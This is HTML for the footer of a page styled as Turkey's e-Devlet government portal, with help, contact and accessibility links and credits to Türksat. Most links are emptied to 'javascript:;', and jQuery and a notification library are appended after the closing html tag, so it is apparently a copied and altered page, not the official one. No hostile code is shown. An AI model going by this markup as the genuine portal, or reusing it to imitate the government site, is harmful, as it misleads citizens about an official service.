                                <a >Yeni Eklenen Hizmetler</a>
                            </li>
                            <li>
                                <a  accesskey="h">Kurum Hizmetleri</a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Yardım</h3>
                        <ul>
                            <li>
                                <a  accesskey="6">Genel Yardım</a>
                            </li>
                            <li>
                                <a  accesskey="5">Sıkça Sorulanlar</a>
                            </li>
                            <li>
                                <a >Güvenliğiniz İçin</a>
                            </li>
                            <li>
                                <a >Help For Non-Citizens</a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Bize Ulaşın</h3>
                        <ul>
                            <li>
                                <a  accesskey="9">İletişim</a>
                            </li>
                            <li>
                                <a >CİMER Başvurusu</a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Erişilebilirlik</h3>
                        <ul>
                            <li>
                                <a href="#" class="textOnlyToggle" data-state="html">Salt Metin Sürümü</a>
                            </li>
                            <li>
                                <a href="#" class="fontSizeToggle" data-state="normal">Daha Belirgin Odaklama</a>
                            </li>
                            <li>
                                <a accesskey="0" >Klavye Kısayolları</a>
                            </li>
                            <li>
                                <a href="/site-haritasi" accesskey="3">Site Haritası</a>
                            </li>
                        </ul>
                    </li>
                </ul>
            </nav>
            <div class="right-part">
                <nav class="foot-card">
                    <h2>İletişim Seçenekleri</h2>
                    <div class="card-text">
                        <em>Yardım mı lazım?</em> Aşağıdaki yöntemleri kullanarak bizimle iletişime geçebilirsiniz.
                    </div>
                    <ul>
                        <li>
                            <a href="javascript:;"><i class="fa-regular fa-comments"></i> Hızlı Çözüm Merkezi</a>
                        </li>
                        <li>
                            <a href="javascript:;""><i class="fa-regular fa-envelope"></i> Bize Yazın</a>
                        </li>
                        <li>
                            <a href="javascript:;"><i class="fa-solid fa-phone-flip"></i> e-Devlet Çağrı Merkezi</a>
                        </li>
                        <li>
                            <a href="javascript:;"><i class="fa-solid fa-ear-deaf"></i> Engelsiz Çağrı Merkezi</a>
                        </li>
                    </ul>
                </nav>
                <nav class="social-links">
                    <a ><i class="fa-brands fa-facebook-f"></i> Facebook </a>
                    <a ><i class="fa-brands fa-x-twitter"></i> Twitter </a>
                    <a ><i class="fa-brands fa-youtube"></i> Youtube </a>
                    <a ><i class="fa-brands fa-instagram"></i> Instagram </a>
                </nav>
            </div>
        </div>
        <div class="sub-copyright">
            <div class="images">
                <a class="externalLink" rel="external" href="javascript:;">
                  
                </a>
                <a class="externalLink" rel="external" href="javascript:;">
                   
                </a>
            </div>
            <div class="text1">e-Devlet Kapısı’nın kurulması ve yönetilmesi görevi <a href="javascript:;">T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı</a> tarafından yürütülmekte olup, sistemin geliştirilmesi ve işletilmesi <a class="externalLink" href="http://www.turksat.com.tr" rel="external">Türksat A.Ş.</a> tarafından yapılmaktadır. </div>
        </div>
        <div class="copyright">© <time datetime="2025-01-20">2025</time> Tüm Hakları Saklıdır.
            <a >Gizlilik, Kullanım ve Telif Hakları</a> bildiriminde belirtilen kurallar çerçevesinde hizmet sunulmaktadır.
        </div>
    </div>
</footer>
<a href="#" class="scroll-top hide-on-print" role="button" title="Sayfayı Yukarı Kaydır" style="display: inline;">
    <i class="fa-solid fa-chevron-up"></i>
</a>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"14d1d027c8904f0894e1033694aa6bef","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>

</html><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<style>    [data-notify-text], [data-notify-html]{
        position: relative;    word-wrap: break-word;    width: 380px;    display: block;    text-overflow: clip;    white-space: break-spaces;    }
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/styles/metro/notify-metro.css" integrity="sha512-CJ6VRGlIRSV07FmulP+EcCkzFxoJKQuECGbXNjMMkqu7v3QYj37Cklva0Q0D/23zGwjdvoM4Oy+fIIKhcQPZ9Q==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js" integrity="sha512-efUTj3HdSPwWJ9gjfGR71X9cvsrthIA78/Fvd/IN+fttQVy7XWkOAXb295j8B3cmm/kFKVxjiNYzKw9IQJHIuQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
